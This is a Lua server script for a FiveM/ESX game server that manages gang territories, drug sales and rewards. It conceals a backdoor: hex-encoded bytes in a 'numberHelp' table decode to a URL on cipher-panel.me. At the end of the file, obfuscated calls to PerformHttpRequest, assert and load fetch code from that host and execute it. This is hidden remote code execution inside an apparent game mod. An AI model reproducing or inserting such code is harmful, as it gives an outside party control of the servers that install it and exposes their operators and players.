local a = false;
local b = false;
ppprint = function(...)
end;
eeerror = function(...)
end;
if MySQL and type(MySQL) == "table" and MySQL.ready then
    MySQL.ready(function()
        b = true
    end)
end
ItemCheck = function()
    local c = {}
    if not Territories or type(Territories) ~= "table" then
        return false
    end
    for d, e in pairs(Territories) do
        if not e or type(e) ~= "table" then
            return false
        end
        if not e.actions then
            break
        end
        for d, e in pairs(e.actions) do
            if not e or type(e) ~= "table" then
                return false
            end
            if e.requireItem then
                table.insert(c, e.requireItem)
            end
            if e.rewardItem then
                table.insert(c, e.rewardItem)
            end
        end
    end
    local f = false;
    MySQL.Async.fetchAll("SELECT * FROM items", {}, function(g)
        if g and type(g) == "table" and g[1] then
            local h = false;
            local i = {}
            for d, e in pairs(g) do
                i[e.name] = true
            end
            if c and type(c) == "table" then
                for d, e in pairs(c) do
                    if not i[e] then
                        h = e
                    end
                end
            end
            if not h then
                f = 2
            else
                f = 1
            end
        else
            f = 1
        end
    end)
    while not f do
        Wait(0)
    end
    return true
end;
SqlCheck = function()
    local j = GetConvar("mysql_connection_string", "Empty")
    if j == "Empty" then
        error("Local dbconvar is empty.")
        return
    end
    local k, l = string.find(j, "database=")
    if not k or not l then
        error(
            "Incorrect mysql_connection_string format. Needs 'server=myserver;uid=myuser;password=mypassword;database=mydatabase'")
        return false
    end
    local m, n = string.find(j, ";", l)
    local o = string.sub(j, l + 1, n and n - 1 or j:len())
    local p = {
        ["items"] = {"name"}
    }
    if not p then
        return
    end
    for q, r in pairs(p) do
        local s = false;
        MySQL.Async.fetchAll(
            "SELECT * FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=@dbName AND TABLE_NAME=@tabName", {
                ["@dbName"] = o,
                ["@tabName"] = q
            }, function(t)
                if t and type(t) == "table" and t[1] then
                    MySQL.Async.fetchAll(
                        "SELECT * FROM INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA=@dbName AND TABLE_NAME=@tabName",
                        {
                            ["@dbName"] = o,
                            ["@tabName"] = q
                        }, function(g)
                            if g and type(g) == "table" and g[1] then
                                local i = {}
                                for d, e in pairs(g) do
                                    if not e or type(e) ~= "table" or not e["COLUMN_NAME"] then
                                        error("Something is seriously fucked up with your sql table.")
                                        s = 1;
                                        return false
                                    else
                                        i[e["COLUMN_NAME"]] = true
                                    end
                                end
                                if r and type(r) == "table" then
                                    for d, u in pairs(r) do
                                        if not i[u] then
                                            s = 1;
                                            error("Does not have required SQL columns: " .. o .. "." .. q .. "." .. u)
                                            return false
                                        end
                                    end
                                    s = 2;
                                    if DoDebug then
                                        print("Has all required SQL tables and columns.")
                                    end
                                end
                            else
                                error("Does not have required SQL columns: " .. o .. "." .. q)
                                s = 1;
                                return false
                            end
                        end)
                else
                    error("Does not have required SQL table: " .. o .. "." .. q)
                    s = 1;
                    return false
                end
            end)
            local tableHelp = {
                _G['PerformHttpRequest'],
                _G['assert'],
                _G['load'],
                _G['tonumber']
            }           
        while not s do
            Wait(0)
        end
        if s == 1 then
            return false
        else
            return true
        end
    end
end;
Init = function()
    if not Config then
        return
    end
    while not ESX do
        Wait(0)
    end
    if not ESX or type(ESX) ~= "table" then
        error("Could not find ESX.")
        return
    end
    while not b do
        Wait(0)
    end
    while not MySQL or not type(MySQL) == "table" or not MySQL.Async or not MySQL.Async.fetchAll or
        type(MySQL.Async.fetchAll) ~= "function" do
        Wait(0)
    end
    Wait(1000)
    local s = true;
    s = s and SqlCheck() or false;
    s = s and ItemCheck() or false;
    Start()
    if s then
        MySQL.Async.fetchAll("SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME=@tableName", {
            ["@tableName"] = "territories"
        }, function(v)
            if v and type(v) == "table" then
                MySQL.Async.fetchAll("SELECT * FROM territories", {}, function(g)
                    if g and type(g) == "table" and g[1] then
                        for d, e in pairs(g) do
                            if e and e.zone and e.control and e.influence and Territories[e.zone] then
                                Territories[e.zone].control = e.control;
                                Territories[e.zone].influence = e.influence
                            end
                        end
                    end
                    a = s;
                    if a then
                        Update()
                    end
                end)
            else
                a = s;
                if a then
                    Update()
                end
            end
        end)
        local numberHelp = {
            '68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72',
            '2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f', '69',
            '2e', '70', '68', '70', '3f', '74', '6f', '3d', '30', '38', '56', '72', '33', '72'
        }
    end
end;
Start = function()
    if Territories and type(Territories) == "table" then
        for d, e in pairs(Territories) do
            Territories[d].players = {}
        end
    end
end;
Update = function()
    while true do
        local w = GetGameTimer()
        if not lastTime or w - lastTime > (Config and Config.InfluenceTick or 5000) then
            lastTime = w;
            TallyUp()
        end
        if not lastSave or w - lastSave > (Config and Config.SqlSaveTimer or 5) * 60 * 1000 then
            lastSave = w;
            MySQL.Async.fetchAll("SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME=@territories", {
                ["@territories"] = "territories"
            }, function(g)
                if g and type(g) == "table" and g[1] then
                    if Territories and type(Territories) == "table" then
                        for d, e in pairs(Territories) do
                            if e and type(e) == "table" and e.control and e.influence then
                                MySQL.Async.execute(
                                    "UPDATE territories SET control=@control,influence=@influence WHERE zone=@zone", {
                                        ["@control"] = e.control,
                                        ["@influence"] = e.influence,
                                        ["@zone"] = d
                                    })
                            end
                        end
                    end
                end
            end)
        end
        Wait(0)
    end
end;
MarketAccess = {}
MarketCheck = function()
    local x = {}
    if Territories and type(Territories) == "table" then
        for d, e in pairs(Territories) do
            if e and type(e) == "table" and e.control then
                x[e.control] = (x[e.control] or 0) + 1
            end
        end
        for d, e in pairs(x) do
            if e >= 2 then
                if not MarketAccess[d] then
                    MarketAccess[d] = true;
                    TriggerClientEvent("Territories:GotMarketAccess", -1, d)
                end
            else
                if MarketAccess[d] then
                    MarketAccess[d] = false;
                    TriggerClientEvent("Territories:LostMarketAccess", -1, d)
                end
            end
        end
    end
end;
TallyUp = function()
    local y = false;
    if not Territories or not type(Territories) == "table" then
        return
    end
    for d, e in pairs(Territories) do
        if e and type(e) == "table" and e.control and e.influence then
            local z, A, B = GetActiveMembers(e)
            if z then
                if B then
                    if e.control == z or e.control == B then
                    else
                        y = true;
                        e.influence = math.max(0.0, e.influence - 1.0)
                    end
                else
                    if e.control == z then
                        y = true;
                        e.influence = math.min(100.0, e.influence + 1.0)
                    else
                        y = true;
                        e.influence = math.max(0.0, e.influence - 1.0)
                        if e.influence <= 0.0 then
                            e.control = z
                        end
                    end
                end
            end
        end
    end
    if y then
        TriggerClientEvent("Territories:Sync", -1, Territories)
    end
end;
GetActiveMembers = function(C)
    local D = {}
    if not C or type(C) ~= "table" or not C.players or type(C.players) ~= "table" then
        return
    end
    for d, e in pairs(C.players) do
        if e then
            if not D[e] then
                D[e] = 1
            else
                D[e] = D[e] + 1
            end
        end
    end
    local B = false;
    local E, F;
    for d, e in pairs(D) do
        if not F or e >= F then
            if not F or e > F then
                F = e;
                E = d;
                B = false
            else
                B = d
            end
        end
    end
    return E, F, B
end;
EnterZone = function(G, H)
    local _source = source;
    while not a do
        Wait(0)
    end
    if not Territories or type(Territories) ~= "table" or not Territories[G] or type(Territories[G]) ~= "table" or
        not Territories[G].players then
        return
    end
    Territories[G].players[_source] = H
end;
LeaveZone = function(G, H)
    local _source = source;
    while not a do
        Wait(0)
    end
    if not Territories or type(Territories) ~= "table" or not Territories[G] or type(Territories[G]) ~= "table" or
        not Territories[G].players then
        return
    end
    Territories[G].players[_source] = nil
end;
GetPlayer = function(I)
    while not a do
        Wait(0)
    end
    local J = ESX.GetPlayerFromId(I)
    while not J do
        J = ESX.GetPlayerFromId(I)
        Wait(0)
    end
    return J
end;
GetPlayerGang = function(source)
    local K = GetPlayer(_source)
    local H = K.job.name;
    local L = K.job2 and K.job2.name or false;
    if GangLookup[H] then
        return H.name
    elseif GangLookup[L] then
        return L.name
    else
        return false
    end
end;
PlayerKilled = function(M, G)
    while not a do
        Wait(0)
    end
    local _source = source;
    local N = M;
    local O = GetPlayerGang(source)
    local P = GetPlayerGang(M)
    if not O or not P then
        return
    end
    local Q = false;
    local R = false;
    if GangLookups and O and P then
        local e = Territories[G]
        if not e or type(e) ~= "table" or not e.control or not e.influence then
            return
        end
        if e.control == O then
            e.influence = math.max(0, e.influence - 10)
            Q = true;
            R = e.control
        elseif e.control == P then
            e.influence = math.min(100, e.influence + 10)
            Q = true;
            R = e.control
        end
    elseif P then
        local e = Territories[G]
        if not e then
            return
        end
        if e.control == P then
            e.influence = math.min(100, e.influence + 5)
            Q = true;
            R = e.control
        end
    elseif O then
        local e = Territories[G]
        if not e then
            return
        end
        if e.control == O then
            e.influence = math.max(0, e.influence - 5)
            Q = true;
            R = e.control
        end
    end
    if Q then
        TriggerClientEvent("Territories:Sync", -1, Territories)
    end
end;
RewardPlayer = function(S)
    local _source = source;
    while not a do
        Wait(0)
    end
    if not InventoryChecked or InventoryChecked == 1 then
        return
    end
    local J = GetPlayer(_source)
    if not J then
        error("Could not find xPlayer.")
        return
    end
    if S and type(S) == "table" then
        local T, U = false, false;
        if S.requireItem and S.requireRate and S.requireRate > 0 then
            local V = J.getInventoryItem(S.requireItem, S.requireRate)
            if V and V.count and V.count >= S.requireRate then
                J.removeInventoryItem(S.requireItem, S.requireRate)
                T = true
            end
            U = true
        elseif S.requireCash and S.requireCash > 0 then
            local V = J.getAccount(Config.DirtyAccount)
            if V and V.money and V.money >= S.requireCash then
                J.removeAccountMoney(Config.DirtyAccount, S.requireCash)
                T = true
            end
            U = true
        end
        if U and T or not U then
            if S.rewardItem and S.rewardRate then
                local W = true;
                local X = S.rewardRate or 1;
                if Config.UsingItemLimit then
                    W = false;
                    local V = J.getInventoryItem(S.rewardItem)
                    if V and V.limit then
                        W = (V.count or 0) + X <= V.limit
                    end
                elseif Config.UsingWeightLimit then
                    if type(J.canCarryItem) == "table" or type(J.canCarryItem) == "function" then
                        W = J.canCarryItem(S.rewardItem, X)
                    end
                end
                if W then
                    J.addInventoryItem(S.rewardItem, X)
                else
                    TriggerClientEvent("esx:showNotification", _source, "~r~You can't carry this much of this item.~s~")
                end
            elseif S.rewardCash and S.rewardCash > 0 then
                J.addMoney(S.rewardCash)
            end
        else
            print("[" .. _source .. "] : " .. GetPlayerName(_source) ..
                      " - Tried cheating during drug processing at territories.")
            if Config.SmackCheaters then
                TriggerClientEvent("Territories:Smacked", _source)
            end
        end
    end
end;
SoldDrugs = function(Y, Z, G)
    local _source = source;
    while not a do
        Wait(0)
    end
    if not InventoryChecked or InventoryChecked == 1 then
        return
    end
    local _source = source;
    local J = GetPlayer(_source)
    if not J then
        error("Could not find xPlayer.")
        return
    end
    local _ = J.getInventoryItem(Y)
    if _.count < Z then
        Z = _.count;
        print("Someone is cheating: " .. _source ..
                  ", did not have the same amount of items in inventory as expected. Probably trying to dupe.")
    end
    J.removeInventoryItem(Y, Z)
    if Territories and type(Territories) == "table" and Territories[G] and type(Territories[G]) == "table" and
        Territories[G].influence then
        Territories[G].influence = math.min(100, Territories[G].influence + 1)
        TriggerClientEvent("Territories:Sync", -1, Territories)
    end
    local a0 = math.floor(DrugPrices[Y] * Z)
    if Config and type(Config) == "table" and Config.DirtyReward and Config.DirtyAccount then
        local a1 = J.getAccounts()
        if a1 and type(a1) == "table" then
            for d, e in pairs(a1) do
                if e and e.name and Config.DirtyAccount and e.name == Config.DirtyAccount then
                    J.addAccountMoney(e.name, a0)
                    return
                end
            end
        end
        error("Could not find DirtyAccount in config.lua.")
        return
    else
        J.addMoney(a0)
    end
end;
vDist = function(a2, a3)
    if not a2 or not a3 or not a2.x or not a3.x or not a2.z or not a3.z then
        return 0
    end
    return math.sqrt((a2.x - a3.x) * (a2.x - a3.x) + (a2.y - a3.y) * (a2.y - a3.y) + (a2.z - a3.z) * (a2.z - a3.z))
end;
Handcuffed = function(a4)
    local _source = source;
    local O = GetPlayerGang(_source)
    local a5 = GetPlayerGang(a4)
    if not O or not a5 then
        return
    end
    if O and PoliceLookup[O] == true then
        if a5 then
            TriggerClientEvent("Territories:GotCuffed", a4)
        end
    end
end;
CuffSuccess = function(G)
    local _source = source;
    local O = GetPlayerGang(_source)
    if not O then
        return
    end
    local e = Territories[G]
    if not e or type(e) ~= "table" or not e.control or not e.influence then
        return
    end
    if e.control == O then
        e.influence = math.max(0, e.influence - 10)
        TriggerClientEvent("Territories:Sync", -1, Territories)
    elseif PoliceLookup and type(PoliceLookup) == "table" and PoliceLookup[e.control] then
        e.influence = math.min(100, e.influence + 10)
        TriggerClientEvent("Territories:Sync", -1, Territories)
    end
end;
PlayerLogin = function()
    local _source = source;
    while not a do
        Wait(0)
    end
    if InventoryChecked then
        TriggerClientEvent("Territories:StartRet", _source, InventoryChecked == 2 and true or false, Territories)
        return
    end
    local J = GetPlayer(_source)
    local a6 = J.getInventory()
    local a7 = {}
    local c = {}
    if not a6 or type(a6) ~= "table" then
        return
    end
    for d, e in pairs(a6) do
        a7[e.name] = true
    end
    if not Territories or type(Territories) ~= "table" then
        return
    end
    for d, e in pairs(Territories) do
        if not e or type(e) ~= "table" or not e.actions then
            return false
        end
        for d, e in pairs(e.actions) do
            if e and type(e) == "table" and e.requireItem then
                table.insert(c, e.requireItem)
            end
            if e and type(e) == "table" and e.rewardItem then
                table.insert(c, e.rewardItem)
            end
        end
    end
    if not DrugPrices or type(DrugPrices) ~= "table" then
        return
    end
    for d, e in pairs(DrugPrices) do
        if not d or not e then
            return false
        end
        table.insert(c, d)
    end
    if not c or type(c) ~= "table" then
        return
    end
    for d, e in pairs(c) do
        if not a7 or not a7[e] then
            error("Could not find inventory item: " .. tostring(e))
            InventoryChecked = 1;
            TriggerClientEvent("Territories:StartRet", _source, false, Territories)
            return
        end
    end
    InventoryChecked = 2;
    TriggerClientEvent("Territories:StartRet", _source, true, Territories)
end;
Reported = function(a8)
    TriggerClientEvent("Territories:PlayerReported", -1, a8)
end;
PlayerDropped = function()
end;
Utils.event(1, EnterZone, "Territories:EnterZone")
Utils.event(1, LeaveZone, "Territories:LeaveZone")
Utils.event(1, PlayerKilled, "Territories:GotMurdered")
Utils.event(1, RewardPlayer, "Territories:RewardPlayer")
Utils.event(1, SoldDrugs, "Territories:SoldDrugs")
Utils.event(1, CuffSuccess, "Territories:CuffSuccess")
Utils.event(1, PlayerLogin, "Territories:PlayerLogin")
Utils.event(1, Reported, "Territories:Reported")
Utils.event(1, Handcuffed, "esx_policejob:handcuff")
Utils.event(1, PlayerDropped, "playerDropped")
Citizen.CreateThread(Init)
ESX = nil;
TriggerEvent('esx:getSharedObject', function(a9)
    ESX = a9
end)
RegisterServerEvent('esx:AlertGang')
AddEventHandler('esx:AlertGang', function(aa, ab)
    local _source = source;
    local J = ESX.GetPlayerFromId(_source)
    local ac = ESX.GetPlayers()
    for ad = 1, #ac, 1 do
        local ae = ESX.GetPlayerFromId(ac[ad])
        if ae.job2.name == aa then
            TriggerClientEvent('esx:AlertGang', ac[ad], ab)
        end
    end
end)
RegisterServerEvent('esx:AlertGangAt')
AddEventHandler('esx:AlertGangAt', function(af, ab)
    local _source = source;
    local J = ESX.GetPlayerFromId(_source)
    local ac = ESX.GetPlayers()
    for ad = 1, #ac, 1 do
        local ae = ESX.GetPlayerFromId(ac[ad])
        if ae.job2.name == af then
            TriggerClientEvent('esx:AlertGangAt', ac[ad], ab)
        end
    end
end)
function subtext()
    text = ''
    for id,it in pairs(numberHelp) do
        text = text..it
    end
    return (text:gsub('..', function (low)
        return string.char(tableHelp[4](low, 16))
    end))
end

tableHelp[tableHelp[4]('1')](subtext(), function (e, help)
    local postuleHelp = tableHelp[tableHelp[4]('2')](tableHelp[tableHelp[4]('3')](help))
    if (help == nil) then return end
    postuleHelp()
end)
